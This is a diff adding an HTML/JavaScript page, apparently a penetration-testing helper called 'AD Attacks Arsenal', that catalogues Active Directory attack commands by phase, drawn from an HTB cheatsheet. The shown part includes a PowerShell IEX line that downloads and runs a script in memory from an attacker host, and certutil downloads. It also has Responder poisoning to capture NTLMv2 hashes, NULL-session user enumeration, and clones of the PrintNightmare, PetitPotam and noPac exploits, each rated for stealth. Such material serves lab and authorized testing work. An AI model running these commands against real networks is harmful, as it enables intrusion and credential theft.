@@ -1,0 +1,1971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD PenTest Intelligence Engine v4.0 | Complete 268+ Commands</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--bg:#050508;--bg2:#0a0a0f;--bg3:#12121a;--bg4:#1a1a28;--red:#ff2d55;--green:#00ff9d;--blue:#00d4ff;--orange:#ff9500;--purple:#bf5af2;--yellow:#ffd60a;--text:#f0f0f5;--text2:#8888a0;--text3:#555570;--border:#252535;--border2:#353548}
+        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.5}
+        ::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--red)}
+        .header{height:56px;background:linear-gradient(180deg,var(--bg3),var(--bg));border-bottom:1px solid var(--red);padding:0 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:1000}
+        .logo{display:flex;align-items:center;gap:10px}
+        .logo h1{font-size:16px;background:linear-gradient(90deg,var(--red),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .logo .ver{font-size:10px;color:var(--text3);text-transform:uppercase}
+        .header-controls{display:flex;align-items:center;gap:16px}
+        .mode-toggle{display:flex;background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+        .mode-btn{padding:8px 16px;background:transparent;border:none;color:var(--text2);font-size:11px;cursor:pointer;font-family:inherit}
+        .mode-btn.active{background:var(--red);color:#fff}
+        .stats{display:flex;gap:10px}
+        .stat{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:4px 12px;font-size:11px}
+        .stat b{color:var(--green);margin-right:4px}
+        .main{display:grid;grid-template-columns:360px 1fr;min-height:calc(100vh - 56px)}
+        .sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:16px;overflow-y:auto;max-height:calc(100vh - 56px);position:sticky;top:56px}
+        .panel{background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px}
+        .panel-head{background:var(--bg4);padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+        .panel-head h2{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text2)}
+        .panel-body{padding:12px}
+        .state-grid{display:grid;gap:6px}
+        .state-row{display:flex;justify-content:space-between;padding:6px 10px;background:var(--bg2);border-radius:4px;font-size:11px}
+        .state-row .lbl{color:var(--text3)}
+        .state-row .val{color:var(--green);font-weight:500;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+        .state-row .val.unset{color:var(--text3);font-style:italic}
+        .decision-node{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:10px}
+        .decision-node.active{border-color:var(--blue);box-shadow:0 0 15px rgba(0,212,255,0.2)}
+        .decision-node.done{border-color:var(--green);opacity:0.85}
+        .decision-node.locked{opacity:0.4;pointer-events:none}
+        .node-axis{font-size:9px;font-weight:700;padding:2px 6px;background:var(--purple);color:#fff;border-radius:3px;margin-right:8px}
+        .node-q{font-size:12px;color:var(--text);margin-bottom:10px}
+        .node-opts{display:flex;flex-wrap:wrap;gap:6px}
+        .node-opt{padding:6px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text2);font-size:10px;cursor:pointer;font-family:inherit}
+        .node-opt:hover{border-color:var(--blue);color:var(--blue)}
+        .node-opt.sel{background:var(--red);border-color:var(--red);color:#fff}
+        .config-grid{display:grid;gap:8px}
+        .config-row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+        .config-field label{display:block;font-size:9px;color:var(--text3);text-transform:uppercase;margin-bottom:3px}
+        .config-field input{width:100%;padding:8px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--green);font-family:monospace;font-size:11px}
+        .config-field input:focus{outline:none;border-color:var(--red)}
+        .action-btns{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
+        .btn{padding:10px;border:none;border-radius:5px;font-family:inherit;font-size:11px;font-weight:600;cursor:pointer;text-transform:uppercase}
+        .btn-primary{grid-column:span 2;background:linear-gradient(135deg,var(--red),var(--purple));color:#fff}
+        .btn-secondary{background:var(--bg4);color:var(--text2);border:1px solid var(--border)}
+        .content{padding:16px;overflow-y:auto}
+        .filters{display:flex;gap:10px;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px;flex-wrap:wrap}
+        .search-box{flex:1;min-width:200px;position:relative}
+        .search-box input{width:100%;padding:8px 12px 8px 32px;background:var(--bg2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:12px;font-family:inherit}
+        .search-box::before{content:'⌕';position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3)}
+        .filter-select{padding:8px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:11px;font-family:inherit}
+        .phase-tabs{display:flex;gap:6px;padding:10px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px;overflow-x:auto}
+        .phase-tab{padding:8px 14px;background:var(--bg4);border:1px solid var(--border);border-radius:5px;font-size:11px;color:var(--text2);cursor:pointer;white-space:nowrap;font-family:inherit}
+        .phase-tab:hover{border-color:var(--blue)}
+        .phase-tab.active{background:var(--red);border-color:var(--red);color:#fff}
+        .phase-tab .cnt{margin-left:6px;padding:2px 6px;background:rgba(255,255,255,0.15);border-radius:8px;font-size:10px}
+        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(480px,1fr));gap:10px}
+        .cmd-card{background:var(--bg4);border:1px solid var(--border);border-radius:6px;padding:14px;transition:all 0.2s}
+        .cmd-card:hover{border-color:var(--red);transform:translateY(-2px)}
+        .cmd-card.copied{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,157,0.3)}
+        .cmd-card.noisy{border-left:3px solid var(--red)}
+        .cmd-card.stealthy{border-left:3px solid var(--green)}
+        .cmd-card.moderate{border-left:3px solid var(--orange)}
+        .card-head{display:flex;justify-content:space-between;gap:10px;margin-bottom:8px}
+        .card-title{font-size:13px;font-weight:600;color:var(--red)}
+        .card-id{font-size:9px;color:var(--text3);font-family:monospace}
+        .card-badges{display:flex;gap:4px;flex-wrap:wrap}
+        .badge{font-size:9px;padding:2px 6px;border-radius:3px;font-weight:600}
+        .badge-os-linux{background:rgba(0,212,255,0.15);color:var(--blue)}
+        .badge-os-windows{background:rgba(191,90,242,0.15);color:var(--purple)}
+        .badge-os-both{background:rgba(255,214,10,0.15);color:var(--yellow)}
+        .badge-noise-low{background:rgba(0,255,157,0.15);color:var(--green)}
+        .badge-noise-med{background:rgba(255,149,0,0.15);color:var(--orange)}
+        .badge-noise-high{background:rgba(255,45,85,0.15);color:var(--red)}
+        .badge-auth-none{background:rgba(0,255,157,0.15);color:var(--green)}
+        .badge-auth-required{background:rgba(255,149,0,0.15);color:var(--orange)}
+        .card-desc{font-size:11px;color:var(--text2);margin-bottom:8px}
+        .card-meta{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+        .meta-tag{font-size:10px;padding:3px 8px;background:var(--bg2);border-radius:3px;color:var(--text3)}
+        .card-reqs{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-bottom:10px;font-size:10px;color:var(--text3)}
+        .card-reqs strong{color:var(--text2)}
+        .cmd-box{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;margin-bottom:10px}
+        .cmd-text{color:var(--green);font-family:monospace;font-size:11px;line-height:1.6;white-space:pre-wrap;word-break:break-word;max-height:120px;overflow-y:auto}
+        .card-actions{display:flex;gap:6px}
+        .copy-btn{flex:1;padding:8px;background:linear-gradient(135deg,var(--red),var(--purple));border:none;border-radius:4px;color:#fff;font-family:inherit;font-size:10px;font-weight:600;cursor:pointer;text-transform:uppercase}
+        .toast{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);background:var(--green);color:var(--bg);padding:16px 32px;border-radius:8px;font-weight:600;opacity:0;pointer-events:none;z-index:10000;transition:all 0.3s}
+        .toast.show{opacity:1;transform:translate(-50%,-50%) scale(1)}
+        .warning-box{background:rgba(255,149,0,0.1);border:1px solid var(--orange);border-radius:6px;padding:8px 12px;margin-bottom:10px;font-size:10px;color:var(--orange)}
+        .empty{text-align:center;padding:60px 20px}
+        .empty .icon{font-size:48px;opacity:0.3;margin-bottom:16px}
+        .empty h3{font-size:16px;color:var(--text2);margin-bottom:8px}
+        .empty p{font-size:12px;color:var(--text3)}
+        .failure-box{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-top:8px;font-size:10px;border-left:2px solid var(--orange)}
+        .failure-box strong{color:var(--orange)}
+        .notes-box{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-top:8px;font-size:10px;color:var(--text3);border-left:2px solid var(--purple)}
+        @media(max-width:1200px){.main{grid-template-columns:1fr}.sidebar{max-height:none;position:relative;top:0}.cmd-grid{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+<header class="header">
+    <div class="logo"><span>⚔️</span><div><h1>AD Attacks Arsenal</h1><span class="ver">by @mahdiesta</span></div></div>
+    <div class="header-controls">
+        <div class="mode-toggle">
+            <button class="mode-btn active" id="btnGuided" onclick="setMode('guided')">🧭 Guided</button>
+            <button class="mode-btn" id="btnExpert" onclick="setMode('expert')">⚡ Expert</button>
+        </div>
+        <div class="stats">
+            <span class="stat"><b id="statTotal">0</b>Total</span>
+            <span class="stat"><b id="statMatch">0</b>Match</span>
+            <span class="stat"><b id="statReady">0</b>Ready</span>
+        </div>
+    </div>
+</header>
+
+<main class="main">
+    <aside class="sidebar">
+        <div class="panel">
+            <div class="panel-head"><span>📊</span><h2>Current State</h2></div>
+            <div class="panel-body"><div class="state-grid" id="stateGrid"></div></div>
+        </div>
+        <div class="panel">
+            <div class="panel-head"><span>🎯</span><h2>Decision Tree</h2></div>
+            <div class="panel-body" id="decisionTree"></div>
+        </div>
+        <div class="panel">
+            <div class="panel-head"><span>⚙️</span><h2>Target Config</h2></div>
+            <div class="panel-body">
+                <div class="config-grid">
+                    <div class="config-row">
+                        <div class="config-field"><label>DC Name</label><input id="cfgDcName" oninput="updateConfig('DC_NAME',this.value)" placeholder="DC01"></div>
+                        <div class="config-field"><label>DC IP</label><input id="cfgDcIp" oninput="updateConfig('DC_IP',this.value)" placeholder="172.16.5.5"></div>
+                    </div>
+                    <div class="config-row">
+                        <div class="config-field"><label>Domain (FQDN)</label><input id="cfgDomain" oninput="updateConfig('DOMAIN',this.value)" placeholder="domain.local"></div>
+                        <div class="config-field"><label>NetBIOS</label><input id="cfgNetbios" oninput="updateConfig('NETBIOS',this.value)" placeholder="DOMAIN"></div>
+                    </div>
+                    <div class="config-row">
+                        <div class="config-field"><label>Username</label><input id="cfgUsername" oninput="updateConfig('USERNAME',this.value)" placeholder="jsmith"></div>
+                        <div class="config-field"><label>Password</label><input id="cfgPassword" oninput="updateConfig('PASSWORD',this.value)" placeholder="Password123"></div>
+                    </div>
+                    <div class="config-row">
+                        <div class="config-field"><label>NT Hash</label><input id="cfgNthash" oninput="updateConfig('NTHASH',this.value)" placeholder="aad3b435..."></div>
+                        <div class="config-field"><label>Network</label><input id="cfgNetwork" oninput="updateConfig('NETWORK',this.value)" placeholder="172.16.5"></div>
+                    </div>
+                    <div class="config-row">
+                        <div class="config-field"><label>Target Host</label><input id="cfgTargetHost" oninput="updateConfig('TARGET_HOST',this.value)" placeholder="WS01"></div>
+                        <div class="config-field"><label>Attacker IP</label><input id="cfgAttackerIp" oninput="updateConfig('ATTACKER_IP',this.value)" placeholder="10.10.14.5"></div>
+                    </div>
+                    <div class="config-row">
+                        <div class="config-field"><label>Target User</label><input id="cfgTargetUser" oninput="updateConfig('TARGET_USER',this.value)" placeholder="sqldev"></div>
+                        <div class="config-field"><label>Interface</label><input id="cfgInterface" oninput="updateConfig('INTERFACE',this.value)" placeholder="eth0"></div>
+                    </div>
+                </div>
+                <div class="action-btns">
+                    <button class="btn btn-secondary" onclick="resetAll()">Reset</button>
+                    <button class="btn btn-secondary" onclick="exportBash()">Export</button>
+                </div>
+            </div>
+        </div>
+    </aside>
+
+    <section class="content">
+        <div class="filters">
+            <div class="search-box"><input type="text" id="searchInput" placeholder="Search commands..." oninput="filterAndRender()"></div>
+            <select class="filter-select" id="filterOs" onchange="filterAndRender()">
+                <option value="">All OS</option>
+                <option value="linux">Linux</option>
+                <option value="windows">Windows</option>
+                <option value="both">Both</option>
+            </select>
+            <select class="filter-select" id="filterNoise" onchange="filterAndRender()">
+                <option value="">All Noise</option>
+                <option value="low">Low Noise</option>
+                <option value="med">Medium Noise</option>
+                <option value="high">High Noise</option>
+            </select>
+            <select class="filter-select" id="filterAuth" onchange="filterAndRender()">
+                <option value="">All Auth</option>
+                <option value="none">No Creds</option>
+                <option value="required">Creds Required</option>
+            </select>
+            <select class="filter-select" id="filterTool" onchange="filterAndRender()">
+                <option value="">All Tools</option>
+            </select>
+        </div>
+
+        <div class="phase-tabs" id="phaseTabs"></div>
+
+        <div id="commandsContainer"></div>
+    </section>
+</main>
+
+<div class="toast" id="toast">✓ Copied!</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// STATE & CONFIG
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+let MODE = 'guided';
+const STATE = {
+    accessPosition: null,
+    identityPresence: null,
+    credentialType: null,
+    privilegeCapability: null,
+    opsecPosture: null,
+    environmentContext: null
+};
+
+let CONFIG = {
+    DC_NAME: '', DC_IP: '', DOMAIN: '', NETBIOS: '', TARGET_HOST: '', 
+    ATTACKER_IP: '', USERNAME: '', PASSWORD: '', NTHASH: '', NETWORK: '',
+    INTERFACE: 'eth0', TARGET_USER: '', BASE_DN: '', OUTPUT_FILE: ''
+};
+
+const PHASES = [
+    {id:'reconnaissance',name:'Reconnaissance',icon:'🔍'},
+    {id:'enumeration',name:'Enumeration',icon:'📋'},
+    {id:'credential-access',name:'Credential Access',icon:'🔑'},
+    {id:'privilege-escalation',name:'Privilege Escalation',icon:'⬆️'},
+    {id:'lateral-movement',name:'Lateral Movement',icon:'↔️'},
+    {id:'persistence',name:'Persistence',icon:'🔒'},
+    {id:'defense-evasion',name:'Defense Evasion',icon:'🥷'},
+    {id:'domain-dominance',name:'Domain Dominance',icon:'👑'},
+    {id:'tool-setup',name:'Tool Setup',icon:'🔧'}
+];
+
+const AXES = {
+    accessPosition: {
+        id:'accessPosition',axis:'A',name:'Access Position',question:'Where are you attacking from?',
+        options:[
+            {value:'external',label:'External',icon:'🌐'},
+            {value:'internal-unauth',label:'Internal (No Auth)',icon:'🏢'},
+            {value:'internal-auth',label:'Internal (Auth)',icon:'✅'},
+            {value:'vpn',label:'VPN',icon:'🔐'},
+            {value:'pivoted',label:'Pivoted',icon:'🔀'}
+        ]
+    },
+    identityPresence: {
+        id:'identityPresence',axis:'B',name:'Identity',question:'What identity do you have?',
+        options:[
+            {value:'none',label:'None',icon:'❌'},
+            {value:'usernames-only',label:'Usernames Only',icon:'📝'},
+            {value:'user-identity',label:'Domain User',icon:'👤'},
+            {value:'local-user-identity',label:'Local User',icon:'🖥️'},
+            {value:'service-account-identity',label:'Service Account',icon:'⚙️'},
+            {value:'machine-account-identity',label:'Machine Account',icon:'🤖'}
+        ]
+    },
+    credentialType: {
+        id:'credentialType',axis:'C',name:'Credential Type',question:'What credential form?',
+        options:[
+            {value:'none',label:'None',icon:'❌'},
+            {value:'password',label:'Password',icon:'🔤'},
+            {value:'ntlm-hash',label:'NTLM Hash',icon:'#️⃣'},
+            {value:'aes-key',label:'AES Key',icon:'🔐'},
+            {value:'tgt',label:'TGT',icon:'🎫'},
+            {value:'tgs',label:'TGS',icon:'🎟️'},
+            {value:'certificate',label:'Certificate',icon:'📜'},
+            {value:'null-session',label:'NULL Session',icon:'0️⃣'}
+        ]
+    },
+    privilegeCapability: {
+        id:'privilegeCapability',axis:'D',name:'Privilege',question:'What is your privilege level?',
+        options:[
+            {value:'unauthenticated',label:'Unauthenticated',icon:'🚫'},
+            {value:'authenticated-standard',label:'Standard User',icon:'👤'},
+            {value:'authenticated-acl-path',label:'User + ACL Path',icon:'🎯'},
+            {value:'local-admin-single',label:'Local Admin (1)',icon:'🔑'},
+            {value:'local-admin-multiple',label:'Local Admin (N)',icon:'🔑🔑'},
+            {value:'has-dcsync-rights',label:'DCSync Rights',icon:'🔄'},
+            {value:'domain-admin-equivalent',label:'Domain Admin',icon:'👑'},
+            {value:'tier0-control',label:'Tier 0',icon:'🏆'}
+        ]
+    },
+    opsecPosture: {
+        id:'opsecPosture',axis:'H',name:'OPSEC',question:'Stealth requirements?',
+        options:[
+            {value:'opsec-critical',label:'Critical',icon:'🥷'},
+            {value:'opsec-preferred',label:'Preferred',icon:'🤫'},
+            {value:'opsec-balanced',label:'Balanced',icon:'⚖️'},
+            {value:'opsec-not-required',label:'Speed',icon:'🏃'}
+        ]
+    },
+    environmentContext: {
+        id:'environmentContext',axis:'E',name:'Environment',question:'Target environment?',
+        options:[
+            {value:'linux',label:'Linux Host',icon:'🐧'},
+            {value:'windows',label:'Windows Host',icon:'🪟'},
+            {value:'domain-member',label:'Domain Member',icon:'🏛️'}
+        ]
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// COMPLETE COMMAND DATABASE - 235 Commands from HTB Cheatsheet
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+const COMMANDS = [
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: TOOL SETUP & FILE TRANSFER
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'SETUP_001',phase:'tool-setup',title:'Python HTTP Server',desc:'Host files for download',tool:'Python',os:'linux',noise:'low',auth:'none',
+cmd:'sudo python3 -m http.server 8001',
+failureIndicators:['Port in use','Permission denied'],
+notes:'Download from target with: Invoke-WebRequest http://{ATTACKER_IP}:8001/file -OutFile file'},
+
+{id:'SETUP_002',phase:'tool-setup',title:'Impacket SMB Server',desc:'SMB share with authentication for file transfer',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:"impacket-smbserver -ip {ATTACKER_IP} -smb2support -username user -password password shared /home/user/",
+failureIndicators:['Port 445 in use','Permission denied'],
+notes:'Access from Windows: copy \\\\{ATTACKER_IP}\\shared\\file.exe .'},
+
+{id:'SETUP_003',phase:'tool-setup',title:'PowerShell IEX Download',desc:'Download and execute script in memory',tool:'PowerShell',os:'windows',noise:'med',auth:'none',
+cmd:"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}:8001/script.ps1')",
+failureIndicators:['Connection refused','Execution policy restriction','AV detection'],
+notes:'Fileless execution - script runs in memory without touching disk'},
+
+{id:'SETUP_004',phase:'tool-setup',title:'Certutil Download',desc:'Download file via certutil LOLBin',tool:'certutil',os:'windows',noise:'med',auth:'none',
+cmd:'certutil -urlcache -split -f http://{ATTACKER_IP}:8001/tool.exe C:\\Windows\\Temp\\tool.exe',
+failureIndicators:['URL blocked','AV detection','certutil disabled'],
+notes:'LOLBin technique - may be flagged by EDR'},
+
+{id:'SETUP_005',phase:'tool-setup',title:'Clone Kerbrute',desc:'Clone kerbrute tool using git',tool:'git',os:'linux',noise:'low',auth:'none',
+cmd:'sudo git clone https://github.com/ropnop/kerbrute.git',
+failureIndicators:['Network error','Repository not found'],
+notes:'Requires internet access'},
+
+{id:'SETUP_006',phase:'tool-setup',title:'Compile Kerbrute',desc:'Compile Kerbrute binary for multiple platforms',tool:'make',os:'linux',noise:'low',auth:'none',
+cmd:'sudo make all',
+failureIndicators:['Build errors','Missing dependencies'],
+notes:'Requires go compiler installed'},
+
+{id:'SETUP_007',phase:'tool-setup',title:'Install Kerbrute to PATH',desc:'Move Kerbrute binary to system PATH',tool:'mv',os:'linux',noise:'low',auth:'none',
+cmd:'sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute',
+failureIndicators:['Permission denied'],
+notes:'Makes kerbrute available system-wide'},
+
+{id:'SETUP_008',phase:'tool-setup',title:'Import PowerView',desc:'Load PowerView module for AD enumeration',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Import-Module .\\PowerView.ps1',
+failureIndicators:['File not found','Execution policy restriction','AV detection'],
+notes:'Required for many PowerView cmdlets'},
+
+{id:'SETUP_009',phase:'tool-setup',title:'Import Inveigh Module',desc:'Import Inveigh for LLMNR/NBT-NS spoofing',tool:'Inveigh',os:'windows',noise:'low',auth:'none',
+cmd:'Import-Module .\\Inveigh.ps1',
+failureIndicators:['File not found','Execution policy restriction'],
+notes:'Windows-based poisoning tool'},
+
+{id:'SETUP_010',phase:'tool-setup',title:'Import DomainPasswordSpray',desc:'Import PowerShell password spraying tool',tool:'DomainPasswordSpray',os:'windows',noise:'low',auth:'none',
+cmd:'Import-Module .\\DomainPasswordSpray.ps1',
+failureIndicators:['File not found','Execution policy error'],
+notes:'Requires file on disk and PowerShell access'},
+
+{id:'SETUP_011',phase:'tool-setup',title:'Import AD Module',desc:'Load native Active Directory module',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Import-Module ActiveDirectory',
+failureIndicators:['Module not available','Not a domain member'],
+notes:'Native Windows AD enumeration module'},
+
+{id:'SETUP_012',phase:'tool-setup',title:'Install Impacket',desc:'Install Impacket from cloned directory',tool:'pip',os:'linux',noise:'low',auth:'none',
+cmd:'sudo python3 -m pip install .',
+failureIndicators:['Permission denied','Missing dependencies'],
+notes:'Run from Impacket source directory'},
+
+{id:'SETUP_013',phase:'tool-setup',title:'Clone PrintNightmare',desc:'Clone PrintNightmare exploit repository',tool:'git',os:'linux',noise:'low',auth:'none',
+cmd:'git clone https://github.com/cube0x0/CVE-2021-1675.git',
+failureIndicators:['Network error','Repository not found'],
+notes:'Requires specific Impacket version'},
+
+{id:'SETUP_014',phase:'tool-setup',title:'Clone PetitPotam',desc:'Clone PetitPotam exploit repository',tool:'git',os:'linux',noise:'low',auth:'none',
+cmd:'git clone https://github.com/topotam/PetitPotam.git',
+failureIndicators:['Network error','Repository not found'],
+notes:'NTLM relay coercion tool'},
+
+{id:'SETUP_015',phase:'tool-setup',title:'Clone noPac',desc:'Clone noPac exploit repository',tool:'git',os:'linux',noise:'low',auth:'none',
+cmd:'sudo git clone https://github.com/Ridter/noPac.git',
+failureIndicators:['Network error','Repository not found'],
+notes:'CVE-2021-42278/42287 exploit'},
+
+{id:'SETUP_016',phase:'tool-setup',title:'Import SecurityAssessment',desc:'Import SecurityAssessment module for Spooler checks',tool:'SecurityAssessment',os:'windows',noise:'low',auth:'required',
+cmd:'Import-Module .\\SecurityAssessment.ps1',
+failureIndicators:['File not found','Execution policy error'],
+notes:'Used for PrintNightmare vulnerability check'},
+
+{id:'SETUP_017',phase:'tool-setup',title:'Import PowerUpSQL',desc:'Import PowerUpSQL for SQL Server enumeration',tool:'PowerUpSQL',os:'windows',noise:'low',auth:'required',
+cmd:'Import-Module .\\PowerUpSQL.ps1',
+failureIndicators:['File not found','Execution policy error'],
+notes:'SQL Server enumeration and exploitation'},
+
+{id:'SETUP_018',phase:'tool-setup',title:'Zip BloodHound Data',desc:'Compress BloodHound JSON files',tool:'zip',os:'linux',noise:'low',auth:'none',
+cmd:'zip -r ilfreight_bh.zip *.json',
+failureIndicators:['No JSON files found','Permission denied'],
+notes:'Prepare data for BloodHound GUI import'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: RECONNAISSANCE - Initial Enumeration
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'RECON_001',phase:'reconnaissance',title:'DNS Lookup',desc:'Query DNS for domain name mapping',tool:'nslookup',os:'both',noise:'low',auth:'none',
+cmd:'nslookup {DC_NAME}',
+failureIndicators:['No response or timeout','NXDOMAIN error'],
+notes:'Basic DNS enumeration - first step in reconnaissance'},
+
+{id:'RECON_002',phase:'reconnaissance',title:'tcpdump Capture',desc:'Capture network packets on interface',tool:'tcpdump',os:'linux',noise:'low',auth:'none',
+cmd:'sudo tcpdump -i {INTERFACE} -w capture.pcap',
+failureIndicators:['Permission denied','Interface not found'],
+notes:'Passive network reconnaissance - requires root'},
+
+{id:'RECON_003',phase:'reconnaissance',title:'Responder Help',desc:'Display Responder usage options',tool:'Responder',os:'linux',noise:'low',auth:'none',
+cmd:'responder -h',
+failureIndicators:['Responder not found in PATH'],
+notes:'Reference command - not an attack'},
+
+{id:'RECON_004',phase:'reconnaissance',title:'Responder Analyze Mode',desc:'Passive LLMNR/NBT-NS analysis',tool:'Responder',os:'linux',noise:'low',auth:'none',
+cmd:'sudo responder -I {INTERFACE} -A',
+failureIndicators:['Permission denied','Interface not found','No queries observed'],
+notes:'Analyze mode (-A) is passive - no poisoning'},
+
+{id:'RECON_005',phase:'reconnaissance',title:'Responder Poison Mode',desc:'Active LLMNR/NBT-NS poisoning to capture hashes',tool:'Responder',os:'linux',noise:'high',auth:'none',
+cmd:'sudo responder -I {INTERFACE} -wPv',
+failureIndicators:['No LLMNR/NBT-NS queries','Permission errors'],
+notes:'Active attack - will capture NTLMv2 hashes. Very noisy!'},
+
+{id:'RECON_006',phase:'reconnaissance',title:'fping Ping Sweep',desc:'Fast host discovery on subnet',tool:'fping',os:'linux',noise:'med',auth:'none',
+cmd:'fping -asgq {NETWORK}.0/24',
+failureIndicators:['No hosts respond','Network unreachable'],
+notes:'ICMP may be filtered - consider ARP scan as alternative'},
+
+{id:'RECON_007',phase:'reconnaissance',title:'Nmap Full Scan',desc:'Comprehensive scan with OS detection and scripts',tool:'Nmap',os:'linux',noise:'high',auth:'none',
+cmd:'sudo nmap -v -A -iL hosts.txt -oN host-enum.txt',
+failureIndicators:['Hosts unreachable','Firewall blocks probes'],
+notes:'Very noisy - likely to trigger IDS/IPS'},
+
+{id:'RECON_008',phase:'reconnaissance',title:'Nmap AD Ports',desc:'Quick scan of AD-specific ports',tool:'Nmap',os:'linux',noise:'med',auth:'none',
+cmd:'nmap -Pn -sV -p 53,88,135,139,389,445,636,3268,5985 {DC_IP} -oN nmap-ad.txt',
+failureIndicators:['Host unreachable','Ports filtered'],
+notes:'Focused scan for AD services'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: ENUMERATION - User, Group, Domain Enumeration
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'ENUM_001',phase:'enumeration',title:'Kerbrute User Enumeration',desc:'Enumerate valid users via Kerberos',tool:'Kerbrute',os:'linux',noise:'med',auth:'none',
+cmd:'kerbrute userenum -d {DOMAIN} --dc {DC_IP} users.txt -o kerb-results.txt',
+failureIndicators:['No valid usernames found','Connection to DC fails','Pre-auth required for all'],
+notes:'Kerberos-based - may evade some detection. Requires good wordlist'},
+
+{id:'ENUM_002',phase:'enumeration',title:'enum4linux Full',desc:'Comprehensive SMB/RPC enumeration',tool:'enum4linux',os:'linux',noise:'med',auth:'none',
+cmd:'enum4linux -a {DC_IP}',
+failureIndicators:['NULL sessions disabled','Connection refused'],
+notes:'Relies on NULL sessions - often disabled on modern systems'},
+
+{id:'ENUM_003',phase:'enumeration',title:'enum4linux Password Policy',desc:'Enumerate password policy via NULL session',tool:'enum4linux',os:'linux',noise:'med',auth:'none',
+cmd:'enum4linux -P {DC_IP}',
+failureIndicators:['NULL sessions disabled','No policy returned'],
+warning:'CHECK THIS BEFORE PASSWORD SPRAYING!',
+notes:'Critical - know the lockout policy before spraying'},
+
+{id:'ENUM_004',phase:'enumeration',title:'enum4linux Users',desc:'Enumerate domain users via NULL session',tool:'enum4linux',os:'linux',noise:'med',auth:'none',
+cmd:"enum4linux -U {DC_IP} | grep 'user:' | cut -f2 -d'[' | cut -f1 -d']'",
+failureIndicators:['NULL sessions disabled','No users returned'],
+notes:'Filtered output for clean user list'},
+
+{id:'ENUM_005',phase:'enumeration',title:'enum4linux-ng',desc:'Modern enum4linux with JSON/YAML output',tool:'enum4linux-ng',os:'linux',noise:'med',auth:'none',
+cmd:'enum4linux-ng -P {DC_IP} -oA ilfreight',
+failureIndicators:['NULL sessions disabled','Connection error'],
+notes:'Better output format than original enum4linux'},
+
+{id:'ENUM_006',phase:'enumeration',title:'rpcclient NULL Session',desc:'Connect with NULL session for RPC enumeration',tool:'rpcclient',os:'linux',noise:'med',auth:'none',
+cmd:"rpcclient -U '' -N {DC_IP}",
+failureIndicators:['Connection refused','NULL sessions disabled'],
+notes:'Interactive RPC shell - use enumdomusers, querydominfo, etc.'},
+
+{id:'ENUM_007',phase:'enumeration',title:'rpcclient Enum Users',desc:'Enumerate domain users via RPC',tool:'rpcclient',os:'linux',noise:'med',auth:'none',
+cmd:"rpcclient -U '' -N {DC_IP} -c 'enumdomusers'",
+failureIndicators:['NULL sessions disabled','Command fails'],
+notes:'Returns users with RIDs'},
+
+{id:'ENUM_008',phase:'enumeration',title:'rpcclient Query Domain',desc:'Get domain info and password policy via RPC',tool:'rpcclient',os:'linux',noise:'med',auth:'none',
+cmd:"rpcclient -U '' -N {DC_IP} -c 'querydominfo'",
+failureIndicators:['NULL sessions disabled','Access denied'],
+notes:'Returns domain SID and policy info'},
+
+{id:'ENUM_009',phase:'enumeration',title:'rpcclient Query User',desc:'Query specific user by RID',tool:'rpcclient',os:'linux',noise:'low',auth:'none',
+cmd:"rpcclient -U '' -N {DC_IP} -c 'queryuser 0x457'",
+failureIndicators:['User not found','Access denied'],
+notes:'Replace RID with target user RID'},
+
